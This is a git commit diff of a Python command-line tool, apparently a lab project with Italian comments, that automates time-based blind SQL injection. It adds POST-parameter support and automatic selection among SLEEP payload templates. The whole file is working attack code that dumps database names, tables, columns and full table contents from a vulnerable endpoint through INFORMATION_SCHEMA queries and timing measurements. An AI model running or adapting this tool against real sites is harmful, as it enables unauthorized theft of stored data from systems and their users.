f7174eac6079bf1133defc7bdd5f4a4c51d24b9d
DrOliver <matteo.oliveri.oliver@gmail.com>
2017-03-08 01:17:45 +0100

    Data in POST request can now be passed as parameter. Polished template selection.

--- tool.py
+++ tool.py
@@ -1,19 +1,15 @@
 import requests
 import datetime
 import numpy as np
-#import binascii
+import re
 
 #Usando python bisogna ricordarsi di convertire tutti gli indici usati come interi in str prima di concatenarli
 
 isGet = True
+inxTemplate = 2
 
 #payload base
 #http://192.168.33.10/sqli/time_based_blind.php?email=arthur@guide.com
-
-#
-#    templates[0].format("boh", "bbb") -> "cabbbio boh"
-#    "ca{1}io {0}".format("boh", "bbb") -> "cabbbio boh"
-#    templates = ["table='{1}' {0}", "table={1} {0}"]
 
 # format(sleeptime, column_name, tabledb_name, row, underscores)
 templatesLength = [
@@ -43,18 +39,21 @@ templatesTest = [
     "SLEEP({0})"
 ]
 
-def trovaindicetemplate (url, sleeptime):
+def findTemplate(url, sleeptime):
+    global inxTemplate
     for i in range (0, len(templatesTest)):
-        payload = templatesTest.format(sleeptime)
-        payload2 = "shishkebbab"
-        if(request(url, payload, sleeptime) || request(url,payload2,sleeptime)):
-            return i
+        payload = templatesTest[i].format(sleeptime)
+        #payload2 = "shishkebbab"
+        if(request(url, payload, sleeptime)):
+            inxTemplate = i
+            print(inxTemplate)
+            return
 
 
 #Trova il valore di una cella di una tabella, dopo aver trovato il DB, la tabella e la colonna.
-def findCellValue(url, tabledb_name, row, column_name, sleeptime):
+def findCellValue(url, tabledb_name, row, column_name, params, sleeptime):
     print("findCellValue length")
-    len=0
+    length=0
     undersc = []  #Vettore di caratteri underscore
     concatList = ["CHAR(", "95"]
     for i in range(1, 50):
@@ -69,62 +68,72 @@ def findCellValue(url, tabledb_name, row, column_name, sleeptime):
         #A seconda del comando passato eseguo le query o in metodo GET o in metodo POST
         if(isGet):
             #payload = '\' AND (SELECT SLEEP('+str(sleeptime)+') FROM dual WHERE (SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1) LIKE ' + concatStr + ') -- -'
-            payload = templatesLength[0].format(sleeptime, column_name, tabledb_name, row, concatStr)
+            payload = templatesLength[inxTemplate].format(sleeptime, column_name, tabledb_name, row, concatStr)
         else:
-	        #TODO parametrizzare richiesta in POST
-            payload={
-                'to':templatesLength[2].format(sleeptime, column_name, tabledb_name, row, concatStr),
-                'msg':'msg'    
-	        }
-            
-            #to=cbdhasj&msg='vfdnj'
-            #template[0].format(retval)
+            #Costruzione parametri
+            listParams = re.split('&|=', params)
+            payload = {}
+            for j in range(0, len(listParams)-1, 2):
+                if(listParams[j+1] == '{0}'):
+                    payload[listParams[j]] = templatesLength[inxTemplate].format(sleeptime, column_name, tabledb_name, row, concatStr)
+                else:
+                    payload[listParams[j]] = listParams[j+1]
 
             #print(payload)
 
         #Quando la query fa a buon fine salvo la lunghezza trovata ( es.nome lenght nome DB )
         if(request(url, payload, sleeptime)):
-            len=i
-            print(len)
+            length=i
+            print(length)
             break
 
     print("findCellValue value")
     string = []
-    for pos in range(0, len):    #posizione del carattere
+    for pos in range(0, length):    #posizione del carattere
         for i in range(46, 122):    #char in codifica ascii
 
             #Nuovamente ricontrollo con che metodo invio le query
             if(isGet):
-                payload=templatesCell[0].format(column_name, tabledb_name, row, pos+1, i, sleeptime)
+                payload=templatesCell[inxTemplate].format(column_name, tabledb_name, row, pos+1, i, sleeptime)
             else:
-                payload={
-                    'to':templatesCell[2].format(column_name, tabledb_name, row, pos+1, i, sleeptime),
-                    'msg':'msg'
-                }
+                listParams = re.split('&|=', params)
+                payload = {}
+                for j in range(0, len(listParams)-1, 2):
+                    if(listParams[j+1] == '{0}'):
+                        payload[listParams[j]] = templatesCell[inxTemplate].format(column_name, tabledb_name, row, pos+1, i, sleeptime)
+                    else:
+                        payload[listParams[j]] = listParams[j+1]
+
 
             #Se la query va a buon fine, aggiungo il carattere trovato alla stringa
             if(request(url, payload, sleeptime)):
                 string.append(chr(i))
                 print(string)
                 break
-
     
     return ''.join(string) #Compatto tutti i caratteri
 
 #Trova numero delle righe di una tabella
-def findNumRows(url, tabledb_name, sleeptime):
+def findNumRows(url, tabledb_name, params, sleeptime):
     print("findNumRows")
     numrows=0
     for i in range(1, 100):
         if(isGet):
-            payload = templatesNumRows[0].format(tabledb_name, i, sleeptime)
+            payload = templatesNumRows[inxTemplate].format(tabledb_name, i, sleeptime)
         else:
-            payload={
-                'to':templatesNumRows[2].format(tabledb_name, i, sleeptime),
-                'msg':'cdef'
-            }
+            #Costruzione dizionario
+            #divisione della stringa in forma "arg1=par1%arg2=par2" in lista
+            listParams = re.split('&|=', params)
+            
+            payload = {}
+            for j in range(0, len(listParams)-1, 2):
+                if(listParams[j+1] == '{0}'):   #Si inserisce query nel payload
+                    payload[listParams[j]] = templatesNumRows[inxTemplate].format(tabledb_name, i, sleeptime)
+                else:
+                    payload[listParams[j]] = listParams[j+1]
+            
+            #print(payload)
 
-        #print(payload)
         #Quando la query va a buon fine, salvo il numero di righe trovate e esco dal ciclo
         if(request(url, payload, sleeptime)):
             numrows=i
@@ -157,35 +166,43 @@ def requestTime(url, payload):
     #print(ans.content)
     return ans.elapsed #funz tempo richiesta
 
-#Ritorna i nomi delle colonne
-def findColumnNames(url, dbname, tablename, sleeptime):
-    cols = []
-    numCols = findNumRows(url, "INFORMATION_SCHEMA.COLUMNS WHERE table_name = "+ convertToChar(tablename) +" AND table_schema="+ convertToChar(dbname), sleeptime)
-    for i in range(0, numCols):
-        cols.append(findCellValue(url, "INFORMATION_SCHEMA.COLUMNS WHERE table_name = "+ convertToChar(tablename) +" AND table_schema="+ convertToChar(dbname), i, "column_name", sleeptime))    
-    return cols
     
+#stampa i nomi dei db
+def findDbNames(url, params, sleeptime):
+    numDbs = findNumRows(url, "INFORMATION_SCHEMA.SCHEMATA", params, sleeptime)
+    for i in range(0, numDbs):
+        print(findCellValue(url, "INFORMATION_SCHEMA.SCHEMATA", i, "schema_name", params, sleeptime))
 
 #stampa i nomi delle tabelle
-def findTableNames(url, dbname, sleeptime):
-    numTbls = findNumRows(url, "INFORMATION_SCHEMA.TABLES WHERE table_schema="+ convertToChar(dbname), sleeptime)
+def findTableNames(url, dbname, params, sleeptime):
+    numTbls = findNumRows(url, "INFORMATION_SCHEMA.TABLES WHERE table_schema="+ convertToChar(dbname), params, sleeptime)
     print(numTbls)
     for i in range(0, numTbls):
-        print(findCellValue(url, "INFORMATION_SCHEMA.TABLES WHERE table_schema="+ convertToChar(dbname), i, "table_name", sleeptime))
+        print(findCellValue(url, "INFORMATION_SCHEMA.TABLES WHERE table_schema="+ convertToChar(dbname), i, "table_name", params, sleeptime))
 
-#stampa i nomi dei db
-def findDbNames(url, sleeptime):
-    numDbs = findNumRows(url, "INFORMATION_SCHEMA.SCHEMATA", sleeptime)
-    for i in range(0, numDbs):
-        print(findCellValue(url, "INFORMATION_SCHEMA.SCHEMATA", i, "schema_name", sleeptime))
-    
+#Ritorna i nomi delle colonne
+def findColumnNames(url, dbname, tablename, params, sleeptime):
+    cols = []
+    numCols = findNumRows(url, 
+                "INFORMATION_SCHEMA.COLUMNS WHERE table_name = "+ convertToChar(tablename) +" AND table_schema="+ convertToChar(dbname), 
+                params, 
+                sleeptime)
+    for i in range(0, numCols):
+        cols.append(findCellValue(url,
+                         "INFORMATION_SCHEMA.COLUMNS WHERE table_name = "+ convertToChar(tablename) +" AND table_schema="+ convertToChar(dbname), 
+                         i, 
+                         "column_name", 
+                         params, 
+                         sleeptime))    
+    return cols
+
 #stampa il contenuto di una tabella
-def findTableContent(url, dbname, tablename, columns, sleeptime):
-    numrows=findNumRows(url, tablename, sleeptime)
+def findTableContent(url, dbname, tablename, columns, params, sleeptime):
+    numrows=findNumRows(url, tablename, params, sleeptime)
     for temp in range(0, numrows):
         tempRow=[]
         for column_name in columns:
-            tempRow.append(findCellValue(url, dbname+"."+tablename, temp, column_name, sleeptime))
+            tempRow.append(findCellValue(url, dbname+"."+tablename, temp, column_name, params, sleeptime))
         print(tempRow)
 
 
@@ -210,7 +227,6 @@ def calcRitardo(url):
     for i in range(0, 10):
         times = np.append(times, requestTime(url, "").total_seconds())
 
-
     #toglie due teste e due code
     times = np.delete(times, np.argmax(times))
     times = np.delete(times, np.argmax(times))
@@ -226,36 +242,39 @@ def calcRitardo(url):
 #Iniz parser 
 import argparse
 parser = argparse.ArgumentParser(description="Description of prog")
+# -db "url" -------> funzione che stampa i db
+parser.add_argument('-db', help='stampa elenco dei db. Uso: python tool.py -db [URL]', dest="db", nargs=1)
+
 # -tbl "url", db  -----> funzione che stampa tutte le tbl del db
 parser.add_argument('-tbl', help='stampa tutte le tbl del db. Uso: python tool.py -tbl [URL] [Nome DB]', dest="tbl", nargs=2)
 
 # -all "url", db , tabl -------> funzione che stampa i dati della tabella
-parser.add_argument('-all', help='stampa i dati della tabella. Uso: python tool.py -all [URL] [Nome DB] [Nome Tabella]', dest="all", nargs=3)
-
-# -db "url" -------> funzione che stampa i db
-parser.add_argument('-db', help='stampa elenco dei db. Uso: python tool.py -db [URL]', dest="db", nargs=1)
+parser.add_argument('-all', help='Stampa i dati della tabella. Uso: python tool.py -all [URL] [Nome DB] [Nome Tabella]', dest="all", nargs=3)
 
 # -post --- se si vuole fare le richieste con metodo POST
-#parser.add_argument('--post', help='Usa metodo POST invece di GET', dest="post", const=1, default=0, nargs='?')
-
-parser.add_argument('--post', dest='post', action='store_true', default=False)
+parser.add_argument('--post', help='Abilita la richiesta in POST, passando dei parametri (nella forma arg1=val1&arg2=val2). Uso: --post [Parametri]', dest='post', nargs=1)
 
 args = parser.parse_args()
 
-if(args.post):
+params = ""     #Var globale d'appoggio dei parametri POST
+if(args.post is not None):
     isGet = False
-    #print(findNumRows(args.db[0], "INFORMATION_SCHEMA.SCHEMATA", 2))
-
-if(args.tbl is not None):
-    n=calcRitardo(args.tbl[0])
-    findTableNames(args.tbl[0], args.tbl[1], n)
-
-if(args.all is not None):
-    n=calcRitardo(args.all[0])
-    colNames = findColumnNames(args.all[0], args.all[1], args.all[2], n)
-    print(colNames)
-    findTableContent(args.all[0], args.all[1], args.all[2], colNames, n)
+    params = args.post[0]
 
 if(args.db is not None):
-    n=calcRitardo(args.db[0])
-    findDbNames(args.db[0], n)
+    print(args.db)
+    rit = calcRitardo(args.db[0])
+    findTemplate(args.db[0], rit)
+    findDbNames(args.db[0], params, rit)
+
+if(args.tbl is not None):
+    rit = calcRitardo(args.tbl[0])
+    findTemplate(args.tbl[0], rit)
+    findTableNames(args.tbl[0], args.tbl[1], params, rit)
+
+if(args.all is not None):
+    rit = calcRitardo(args.all[0])
+    findTemplate(args.all[0], rit)
+    colNames = findColumnNames(args.all[0], args.all[1], args.all[2], params, rit)
+    print(colNames)
+    findTableContent(args.all[0], args.all[1], args.all[2], colNames, params, rit)
